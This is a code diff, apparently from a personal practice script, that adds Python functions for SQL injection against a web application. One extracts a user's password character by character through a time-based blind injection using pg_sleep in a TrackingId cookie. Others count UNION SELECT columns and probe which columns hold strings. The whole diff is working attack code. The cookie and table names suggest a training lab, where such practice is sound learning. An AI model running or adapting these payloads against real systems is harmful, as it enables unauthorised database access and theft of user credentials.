@@ -166,6 +166,61 @@ def cast_inj():
 
 # def delay_based_inj(lang_pass, username):
 #     url_response = session.get(base_url)
+def delay_based_inj(ses, url, lang_pass, username, delay):
+    url_response = ses.get(url)
+
+    tracking_id = url_response.cookies.get("TrackingId")
+    session_id = url_response.cookies.get("session")
+
+    pas = ""
+    for i in range(1, lang_pass+1):
+        for j in CHAR_LIST:
+            payload = f"{tracking_id}'||(SELECT CASE WHEN SUBSTRING(password, {i}, 1) = '{j}' THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users WHERE username='{username}')||'"
+
+            cookies_injection = {
+                "TrackingId": payload,
+                "session": session_id
+            }
+
+            res = ses.get(url, cookies=cookies_injection, timeout=delay+5)
+            elapsed = res.elapsed.total_seconds()
+
+            if (delay+5) >= elapsed >= delay:
+                pas+=j
+                print(f"[+] Latter find {i}: {j} | Password: {pas}")
+                break
+        else:
+            print("Can't find a latter")
+            break
+
+def union_table_rekon(ses, url):
+    response = ses.get(url)
+    print(response.status_code)
+    i = 1
+    injection = f"{url}' UNION SELECT NULL-- "
+    while True:
+        res = ses.get(injection)
+
+        if i > 10:
+            return print("Something went wrong")
+        if res.status_code != 200:
+            injection = injection.replace("--", ",NULL--")
+            i+=1
+        else:
+            return print(f"Contain: {i} columns")
+
+def union_table_value_rekon(ses, url, union_inj):
+    matches = list(re.finditer(r'\bNULL\b', union_inj))
+    for ind, m in enumerate(matches):
+        start, end = m.span()
+        payload = union_inj[:start] + "'a'" + union_inj[end:]
+        injection = url + quote(payload, safe='')
+        res = ses.get(injection)
+
+        if res.status_code != 200:
+            print(f"Column {ind+1} - Not an string format")
+        else:
+            print(f"Column {ind+1} - Have string format")
 
 if __name__ == "__main__":
     cookie_sql_verify(session, base_url, 5)
